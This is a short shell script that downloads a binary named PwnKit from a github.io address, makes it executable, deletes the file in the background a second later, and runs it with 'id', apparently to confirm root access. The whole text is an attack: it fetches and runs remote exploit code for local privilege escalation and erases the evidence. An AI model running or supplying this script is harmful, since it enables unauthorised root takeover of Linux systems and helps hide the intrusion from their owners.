curl -fsSL https://LeviathanPerfectHunter.github.io/pwnkit -o PwnKit || exit
chmod +x ./PwnKit || exit
(sleep 1 && rm ./PwnKit & )
./PwnKit 'id'
